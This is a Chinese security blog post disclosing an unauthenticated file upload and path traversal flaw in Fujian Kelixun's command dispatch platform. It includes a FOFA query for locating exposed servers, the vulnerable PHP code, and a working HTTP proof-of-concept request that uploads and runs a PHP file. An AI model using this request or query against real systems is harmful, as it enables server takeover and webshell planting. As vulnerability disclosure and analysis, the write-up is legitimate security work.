---
title: "福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞"
source: https://mrxn.net/jswz/custom-zx-upload-rce.html
asset_dir: assets/福建科立讯通信指挥调度管理平台-customzxupload.php-任意文件上传漏洞
---

# 福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/20 18:23
- 1125浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

平台

鉴权

应用程序接口

---

# 漏洞简介

福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。福建科立讯通信有限公司指挥调度管理平台 custom/zx/upload.php 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份认证的攻击者可通给该漏洞写入如webshell等后门文件，导致服务器失陷。

通讯设备

# 影响版本

# fofa语法

> `body="指挥调度管理平台"`

# 漏洞分析

custom/zx/upload.php 文件很简单，业务逻辑实现如下

```
<?php

        $types=array('txt','png','pdf','jpeg','amr','wav','mp4','avi','mp3','3gp');
        $types1=explode('/', $_FILES['ulfile']['type']);
        if(!in_array($types1[1], $types)){
                echo json_encode(array("code"=>1,"msg"=>"upload file type error"));
                exit();
        }
        if (is_uploaded_file($_FILES['ulfile']['tmp_name'])) {
                move_uploaded_file($_FILES['ulfile']['tmp_name'], $_SERVER['DOCUMENT_ROOT'].'/upload/'.$_FILES['ulfile']['name']);
        }
?>
```

深入探索

传输层安全性协议

计算机安全

Web安全课程

虽然有判断文件类型，但是使用的是文件的 MIME 类型来和预置的类型比较，`$_FILES['ulfile']['type']` 是文件的 MIME 类型，而文件的 MIME 类型 可以通过上传时的file 部分的 `Content-Type: image/png` 来控制从而绕过类型判断，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

其次是上传文件的保存路径直接拼接文件名作为最终的文件保存路径

编程

```
move_uploaded_file($_FILES['ulfile']['tmp_name'], $_SERVER['DOCUMENT_ROOT'].'/upload/'.$_FILES['ulfile']['name']);
```

因此还存在文件目录穿越漏洞，可以通过控制文件名如 `../x.php`来穿越到网站根目录。

# 漏洞复现

## POC

```
POST /custom/zx/upload.php HTTP/1.1
Host: test.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456

------WebKitFormBoundary123456
Content-Disposition: form-data; name="ulfile"; filename="test.php"
Content-Type: image/png

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary123456--
```

[![福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞](images/img-001-4dfa48b962a3.webp)](https://image.mrxn.net/46c7023d35f947ec937994c6e56f8e31.webp)

访问文件 /upload/test.php

漏洞预警服务

[![福建科立讯通信指挥调度管理平台 custom/zx/upload.php 任意文件上传漏洞](images/img-002-f6e0e247844c.webp)](https://image.mrxn.net/87089ec56bb3474f8490a1c525ab9682.webp)

成功执行我们的代码

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
